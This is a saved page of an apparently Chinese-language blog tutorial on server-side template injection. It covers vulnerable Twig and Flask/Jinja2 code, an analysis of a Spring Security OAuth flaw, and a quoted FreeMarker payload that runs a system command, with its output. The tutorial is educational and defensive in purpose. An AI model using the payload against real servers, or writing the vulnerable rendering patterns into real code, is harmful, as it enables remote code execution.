<!DOCTYPE html>
<!-- saved from url=(0115)https://mrking00.github.io/2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="我愿为你收起翅膀，拔剑而战">
    <meta name="keywords" content="Mr_King, Mr_King Blog, Mr_king的博客, Mr_King">
    <meta name="theme-color" content="#000000">
	<meta name="google-site-verification" content="1cqwsRa7rb2N7-FRcVFC7WfPQ87B6N2o08GQE2q7pug">
	<meta name="baidu-site-verification" content="code-50aldXrZvs">
    
    <title>模板注入SSTI漏洞总结 - Mr_king的博客 | Mr_king Blog</title>

    <!-- Web App Manifest -->
    <link rel="manifest" href="https://mrking00.github.io/pwa/manifest.json">

    <!-- Favicon -->
    <link rel="shortcut icon" href="https://mrking00.github.io/img/favicon.ico">

    <!-- Safari Webpage Icon    by-BY -->
    <link rel="apple-touch-icon" href="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/apple-touch-icon.png">
    
    <!-- Canonical URL -->
    <link rel="canonical" href="https://mrking00.github.io//2020/10/12/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/bootstrap.min.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/hux-blog.min.css">

    <!-- Pygments Github CSS -->
    <link rel="stylesheet" href="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/syntax.css">

    <!-- Custom Fonts -->
    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
    <!-- Hux change font-awesome CDN to qiniu -->
    <link href="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/font-awesome.min.css" rel="stylesheet" type="text/css">


    <!-- Hux Delete, sad but pending in China
    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
    css'>
    -->


    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- ga & ba script hoook -->
    <script src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/jquery.nav.js.下载"></script><script src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/fastclick.min.js.下载"></script><script src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/anchor.min.js.下载"></script><script src="./模板注入SSTI漏洞总结 - Mr_king的博客 _ Mr_king Blog_files/push.js.下载"></script><script></script>
<script src="https://eqcn.ajz.miesnfu.com/wp-content/plugins/wp-3d-pony/live2dw/lib/L2Dwidget.min.js"></script><script>
    /*https://unpkg.com/live2d-widget-model-haruto@1.0.5/assets/haruto.model.json*/
    L2Dwidget.init({ "model": { jsonPath:
          "https://unpkg.com/live2d-widget-model-hibiki/assets/hibiki.model.json",
        "scale": 1 }, "display": { "position": "right", "width": 90, "height": 190,
        "hOffset": 0, "vOffset": -20 }, "mobile": { "show": true, "scale": 0.5 },
      "react": { "opacityDefault": 0.8, "opacityOnHover": 0.1 } });
  </script><script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https'){
   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else{
  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script><style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
  position: absolute;
  top: 0;
  right: 0;
  left: 0;
  bottom: 0;
  z-index: 2147483647;
  display: flex;
  justify-content: center;
  align-items: center;
}

.immersive-translate-input-loading {
  --loading-color: #f78fb6;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  display: block;
  margin: 12px auto;
  position: relative;
  color: white;
  left: -100px;
  box-sizing: border-box;
  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
}

@keyframes immersiveTranslateShadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  12% {
    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  25% {
    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  36% {
    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
  }

  50% {
    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
  }

  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
  }

  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
  }

  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
  }

  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}
</style></head>

  <!--小帅哥： https://unpkg.com/live2d-widget-model-chitose@1.0.5/assets/chitose.model.json-->
  <!--萌娘：https://unpkg.com/live2d-widget-model-shizuku@1.0.5/assets/shizuku.model.json-->
  <!--小可爱（女）：https://unpkg.com/live2d-widget-model-koharu@1.0.5/assets/koharu.model.json-->
  <!--小可爱（男）：https://unpkg.com/live2d-widget-model-haruto@1.0.5/assets/haruto.model.json-->
  <!--未知：https://unpkg.com/live2d-widget-model-z16@1.0.5/assets/z16.model.json-->
  <!--初音：https://unpkg.com/live2d-widget-model-miku@1.0.5/assets/miku.model.json-->
   <!-- 上边的不同链接显示的是不同的小人，这个可以根据需要来选择 下边的初始化部分，可以修改宽高来修改小人的大小，或者是鼠标移动到小人上的透明度，也可以修改小人在页面出现的位置。 -->
  	
  

<!-- hack iOS CSS :active style -->
<body ontouchstart="">

    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top is-fixed" translate="no">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="https://mrking00.github.io/">Mr_King Blog</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div id="huxblog_navbar" class=" ">
            <div class="navbar-collapse" style="height: 0px;">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="https://mrking00.github.io/">Home</a>
                    </li>
                    
                    <li>
                        <a href="https://mrking00.github.io/about/">About</a>
                    </li>
                    
                    <li>
                        <a href="https://mrking00.github.io/tags/">Tags</a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>
<script>
    // Drop Bootstarp low-performance Navbar
    // Use customize navbar with high-quality material design animation
    // in high-perf jank-free CSS3 implementation
    var $body   = document.body;
    var $toggle = document.querySelector('.navbar-toggle');
    var $navbar = document.querySelector('#huxblog_navbar');
    var $collapse = document.querySelector('.navbar-collapse');

    var __HuxNav__ = {
        close: function(){
            $navbar.className = " ";
            // wait until animation end.
            setTimeout(function(){
                // prevent frequently toggle
                if($navbar.className.indexOf('in') < 0) {
                    $collapse.style.height = "0px"
                }
            },400)
        },
        open: function(){
            $collapse.style.height = "auto"
            $navbar.className += " in";
        }
    }

    // Bind Event
    $toggle.addEventListener('click', function(e){
        if ($navbar.className.indexOf('in') > 0) {
            __HuxNav__.close()
        }else{
            __HuxNav__.open()
        }
    })

    /**
     * Since Fastclick is used to delegate 'touchstart' globally
     * to hack 300ms delay in iOS by performing a fake 'click',
     * Using 'e.stopPropagation' to stop 'touchstart' event from 
     * $toggle/$collapse will break global delegation.
     * 
     * Instead, we use a 'e.target' filter to prevent handler
     * added to document close HuxNav.  
     *
     * Also, we use 'click' instead of 'touchstart' as compromise
     */
    document.addEventListener('click', function(e){
        if(e.target == $toggle) return;
        if(e.target.className == 'icon-bar') return;
        __HuxNav__.close();
    })
</script>


    <!-- Image to hack wechat -->
<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
<!-- <img src="/img/backimg/bd_2.jpg" width="0" height="0"> -->

<!-- Post Header -->
<style type="text/css">
    header.intro-header{
        position: relative;
        background-image: url('/img/backimg/bd_2.jpg')
    }

    
</style>
<header class="intro-header">
    <div class="header-mask"></div>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <div class="tags">
                        
                        <a class="tag" href="https://mrking00.github.io/tags/#-ssti" title="-ssti">-ssti</a>
                        
                        <a class="tag" href="https://mrking00.github.io/tags/#-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="-学习笔记">-学习笔记</a>
                        
                    </div>
                    <h1>模板注入SSTI漏洞总结</h1>
                    
                    
                    <h2 class="subheading">SSTI</h2>
                    
                    <span class="meta">Posted by mr_king on October 12, 2020</span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

    <!-- Post Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container">

				<h1 id="模板注入ssti漏洞总结">模板注入SSTI漏洞总结</h1>

<p>[TOC]</p>

<h2 id="前言">前言</h2>

<p>本片文章为模板注入，本文出现的双大括号会添加空格或者大括号加百分号也会特殊处理</p>

<h2 id="0x01-什么是注入"><strong>0X01 什么是注入：</strong></h2>

<p>看之前先记住一句话：<strong>注入就是格式化字符串漏洞的一种体现</strong></p>

<p>我们都知道，在01 的世界里，很多的漏洞都能归结为格式化字符串漏洞（不管是二进制还是web），二进制中我们能通过格式化字符串漏洞覆盖返回地址等，web中 SQL 注入就是一个非常好的例子，我们在开发者本来认为我们应该插入正常数据的地方插入了sql语句，这就破坏了原本的SQL 语句的格式，从而执行了与原句完全不同含义的SQL 语句达到了攻击者的目的，同理 XSS 在有些情况下的闭合标签的手法也是利用了格式化字符串这种思想，总之，凡是出现注入的地方就有着格式化字符串的影子。</p>

<h2 id="0x02-什么是模板注入"><strong>0X02 什么是模板注入：</strong></h2>

<p>SSTI （服务器端模板注入）也是格式化字符串的一个非常好的例子，如今的开发已经形成了非常成熟的 MVC 的模式，我们的输入通过 V 接收，交给 C ，然后由 C 调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做模板的技术，<strong>这种模板请不要认为只存在于 Python 中</strong>，感觉网上讲述的都是Python 的 SSTI ,在这之前也给了我非常大的误导(只能说自己没有好好研究，浅尝辄止)<strong>，请记住，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是</strong>，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>

<h2 id="0x03-常见的模板引擎"><strong>0X03 常见的模板引擎</strong></h2>

<h3 id="1php-常用的"><strong>1.php 常用的</strong></h3>

<p><strong>Smarty</strong></p>

<p>Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛</p>

<p><strong>Twig</strong></p>

<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>

<p><strong>Blade</strong></p>

<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>

<p>和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</p>

<h3 id="2java-常用的"><strong>2.Java 常用的</strong></h3>

<p><strong>JSP</strong></p>

<p>这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典</p>

<p><strong>FreeMarker</strong></p>

<p>FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>

<p><strong>Velocity</strong></p>

<p>Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</p>

<h3 id="3python-常用的"><strong>3.Python 常用的</strong></h3>

<p><strong>Jinja2</strong></p>

<p>flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎</p>

<p><strong>django</strong></p>

<p>django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</p>

<p><strong>tornado</strong></p>

<p>tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</p>

<h3 id="注意"><strong>注意：</strong></h3>

<p>同一种语言不同的模板引擎支持的语法虽然很像，但是还是有略微的差异的，比如</p>

<p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号</p>

<pre><code class="language-PYTHON">{ { } }#无空格
</code></pre>

<p>中执行,但是 django 的模板引擎相对于tornado 来说就相对难用一些（<strong>当然方便永远和安全是敌人</strong>）</p>

<h2 id="0x04-ssti-怎么产生的"><strong>0X04 SSTI 怎么产生的</strong></h2>

<p>服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题.</p>

<blockquote>
  <p><strong>补充：</strong></p>

  <p>单纯的字符串拼接并不能带来注入问题，关键要看你拼接的是什么，如果是控制语句，就会造成数据域与代码域的混淆，这样就会出洞</p>
</blockquote>

<p><strong>当然，这种情况一般不属于模板引擎的问题，大多数原因都是开发者并没有很好的处理，比如下面的php 代码</strong></p>

<h3 id="1php-实例"><strong>1.PHP 实例</strong></h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">require_once</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span><span class="mf">.</span><span class="err">‘</span><span class="o">/../</span><span class="n">lib</span><span class="o">/</span><span class="nc">Twig</span><span class="o">/</span><span class="nc">Autoloader</span><span class="mf">.</span><span class="n">php</span><span class="err">‘</span><span class="p">;</span>
<span class="n">Twig_Autoloader</span><span class="o">::</span><span class="nf">register</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
<span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Twig_Environment</span><span class="p">(</span><span class="k">new</span> <span class="nc">Twig_Loader_String</span><span class="p">());</span>
<span class="nv">$output</span> <span class="o">=</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="nf">render</span><span class="p">(</span><span class="s2">"Hello { { name } }"</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">"name"</span> <span class="o">=&gt;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"name"</span><span class="p">]));</span>  <span class="c1">// 将用户输入作为模版变量的值</span>
<span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
</code></pre></div></div>

<p>这段代码明显没有什么问题，用户的输入到时候渲染的时候就是 name 的值，由于name 外面已经有</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span> <span class="p">}</span> <span class="p">}</span>
</code></pre></div></div>

<p>了，也就是说，到时候显示的只是name 变量的值，就算你输入了</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span><span class="n">xxx</span><span class="p">}</span> <span class="p">}</span> 
</code></pre></div></div>

<p>输出也只是</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{  { } }
</code></pre></div></div>

<p>而不会将xxx 作为模板变量解析</p>

<p>但是有些代码就是不这么写，比如下面这段代码</p>

<p><strong>示例PHP代码2：</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">require_once</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span><span class="mf">.</span><span class="err">‘</span><span class="o">/../</span><span class="n">lib</span><span class="o">/</span><span class="nc">Twig</span><span class="o">/</span><span class="nc">Autoloader</span><span class="mf">.</span><span class="n">php</span><span class="err">‘</span><span class="p">;</span>
<span class="n">Twig_Autoloader</span><span class="o">::</span><span class="nf">register</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>

<span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Twig_Environment</span><span class="p">(</span><span class="k">new</span> <span class="nc">Twig_Loader_String</span><span class="p">());</span>
<span class="nv">$output</span> <span class="o">=</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="nf">render</span><span class="p">(</span><span class="s2">"Hello </span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="err">‘</span><span class="n">name</span><span class="err">‘</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>  <span class="c1">// 将用户输入作为模版内容的一部分</span>
<span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
</code></pre></div></div>

<p>你看，现在开发者将用户的输入直接放在要渲染的字符串中了</p>

<p>你看，现在开发者将用户的输入直接放在要渲染的字符串中了</p>

<p><strong>注意：不要把这里的</strong>{ { } }当成是模板变量外面的括号，这里的括号实际上只是为了区分变量和字符串常量而已**，于是我们输入</p>

<p>{ { xxx} }就非常的符合模板的规则，模板引擎一高兴就给解析了，然后服务器就凉了。</p>

<p><strong>这里演示的是PHP 的代码，使用的是 Twig 模板引擎，下面我们看一下 python 的 jinja2</strong></p>

<h3 id="2python-实例"><strong>2.Python 实例</strong></h3>

<h4 id="实例一"><strong>实例一：</strong></h4>

<p><strong>示例Python代码1：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@app.errorhandler(404)
def page_not_found(e):
    template = '''{ % % extends "layout.html" % % }
{ % % block body % % }
    &lt;div class="center-content error"&gt;
        &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;
        &lt;h3&gt;%s&lt;/h3&gt;
    &lt;/div&gt;
{ % % endblock % % }
''' % (request.url)
    return render_template_string(template), 404
</code></pre></div></div>

<p>这是一段经典的 flask 源码，@app.errorhandler(404) 这一部分是装饰器，用于检测404用的，和最后的 ,404呼应的，这与我们这次的测试无关</p>

<p>我们看到，这里本身开发者并没有打算用到什么模板语法，就是使用了一个字符串的格式化来传递一个 url ，但是你别忘了你还是用模板的方式去渲染的啊，也就是说还是支持模板引擎支持的语法，那我们为什么不能输入模板引擎的语法呢？<strong>（永远不要相信用户的输入）</strong></p>

<p>于是我们就能在URL后面跟上</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span> <span class="mi">7</span><span class="o">+</span><span class="mi">7</span> <span class="p">}</span> <span class="p">}</span><span class="c1">#自然而然就能计算出 49 了
</span></code></pre></div></div>

<h4 id="实例二"><strong>实例二：</strong></h4>

<p><strong>示例Python代码2：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># coding: utf-8
import sys
from jinja2 importTemplate

template = Template("Your input: {}".format(sys.argv[1] if len(sys.argv) &gt; 1 else '&lt;empty&gt;'))
print template.render()
</code></pre></div></div>

<p>和上面一样，还是格式化字符串</p>

<h3 id="3-java-实例"><strong>3. JAVA 实例：</strong></h3>

<h4 id="实例一-1"><strong>实例一：</strong></h4>

<p>漏洞分析：https://paper.seebug.org/70/
作者挖掘记录：https://secalert.net/#cve-2016-4977</p>

<p><strong>漏洞浅析：</strong></p>

<p>我们访问这个URL 的时候会报错并在页面上输出 K0rz3n</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=K0rz3n
</code></pre></div></div>

<p>为什么会报错呢？因为K0rz3n 并不符合 redirect_uri 的格式规范</p>

<p>但当我们请求下面这个URL 的时候</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=${2334-1}
</code></pre></div></div>

<p>同样会报错，但是非常奇怪的是，我们的</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${}
</code></pre></div></div>

<p>表达式居然被执行了，输出了 2333，模板注入实锤了，我们来看一下代码，分析一下</p>

<blockquote>
  <p>路径：\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth2\src\main\java\org\springframework\security\oauth2\provider\endpoint\WhitelabelErrorEndpoint.java</p>
</blockquote>

<p><strong>WhitelabelErrorEndpoint.java</strong></p>

<pre><code class="language-JAVA">@FrameworkEndpoint
public class WhitelabelErrorEndpoint {

    private static final String ERROR = "&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;${errorSummary}&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"; //这里是我们的字符串模板

    @RequestMapping("/oauth/error")
    public ModelAndView handleError(HttpServletRequest request) {
        Map&lt;String, Object&gt; model = new HashMap&lt;String, Object&gt;();
        Object error = request.getAttribute("error");
        // The error summary may contain malicious user input,
        // it needs to be escaped to prevent XSS
        String errorSummary;
        if (error instanceof OAuth2Exception) {
            OAuth2Exception oauthError = (OAuth2Exception) error;
            errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());
        }
        else {
            errorSummary = "Unknown error";
        }
        model.put("errorSummary", errorSummary);
        return new ModelAndView(new SpelView(ERROR), model);//通过模板渲染
    }
}
</code></pre>

<p>我们看到，当拿到错误信息以后，就交给了 SpelView(),我们跟进去看一下</p>

<pre><code class="language-BASH">路径：\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth2\src\main\java\org\springframework\security\oauth2\provider\endpoint\SpelView.java
</code></pre>

<p><strong>SpelView.java</strong></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">class</span> <span class="nc">SpelView</span> <span class="kd">implements</span> <span class="nc">View</span> <span class="o">{</span>

    <span class="o">...</span>

    <span class="kd">public</span> <span class="nf">SpelView</span><span class="o">(</span><span class="nc">String</span> <span class="n">template</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">template</span> <span class="o">=</span> <span class="n">template</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">addPropertyAccessor</span><span class="o">(</span><span class="k">new</span> <span class="nc">MapAccessor</span><span class="o">());</span>
        <span class="k">this</span><span class="o">.</span><span class="na">helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PropertyPlaceholderHelper</span><span class="o">(</span><span class="s">"${"</span><span class="o">,</span> <span class="s">"}"</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">resolver</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PlaceholderResolver</span><span class="o">()</span> <span class="o">{</span>
            <span class="kd">public</span> <span class="nc">String</span> <span class="nf">resolvePlaceholder</span><span class="o">(</span><span class="nc">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span><span class="c1">//这里相当于是去一层${}</span>
                <span class="nc">Expression</span> <span class="n">expression</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="na">parseExpression</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
                <span class="nc">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">getValue</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>
                <span class="k">return</span> <span class="n">value</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">value</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">};</span>
    <span class="o">}</span>

    <span class="o">...</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">render</span><span class="o">(</span><span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="o">?&gt;</span> <span class="n">model</span><span class="o">,</span> <span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span>
            <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="o">...</span>
        <span class="nc">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">helper</span><span class="o">.</span><span class="na">replacePlaceholders</span><span class="o">(</span><span class="n">template</span><span class="o">,</span> <span class="n">resolver</span><span class="o">);</span><span class="c1">//replacePlaceholders是一个递归调用，能将第二个参数的${} 中的值取出来，不管有多少层括号</span>
        <span class="o">...</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>resolver 这个参数是经过递归的去</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${}
</code></pre></div></div>

<p>处理的，不信我们看一下 replacePlaceholders()</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public String replacePlaceholders(String value, final Properties properties) {
    Assert.notNull(properties, "'properties' must not be null");
    return replacePlaceholders(value, new PlaceholderResolver() {
        @Override
        public String resolvePlaceholder(String placeholderName) {
            return properties.getProperty(placeholderName);
        }
    });
}
</code></pre></div></div>

<p>很明显这里面递归调用了replacePlaceholders() 函数，最终能得到单纯的表达式，然后渲染的时候放在</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${}
</code></pre></div></div>

<p>就执行了。</p>

<h4 id="实例二-1"><strong>实例二：</strong></h4>

<p>在2015年的blackhat 大会上曾讲述了Alfresco 的一个 SSTI 漏洞，不过很遗憾我没有找到源码，没能亲自分析，只能拿来payload 分析一下。</p>

<p><strong>实例代码：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; 
${ ex("id") }
</code></pre></div></div>

<p><strong>结果：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7) 
</code></pre></div></div>

<blockquote>
  <p><strong>解释：</strong>
https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new
经过我查阅上述freemarker 的文档，这里面的 ?new() 是其高级内置函数</p>
</blockquote>

<p><strong>用法如下：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;
&lt;#assign word_wrapp =“com.acmee.freemarker.WordWrapperDirective”？new（）&gt;
&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;
&lt;#assign word_wrapp_narrow =“com.acmee.freemarker.WordWrapperDirective”？new（40）&gt;
</code></pre></div></div>

<p>相当于是，调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Excute</p>

<h2 id="0x05-检测方法"><strong>0X05 检测方法</strong></h2>

<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>

<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>

<p><strong>示意图如下：</strong></p>

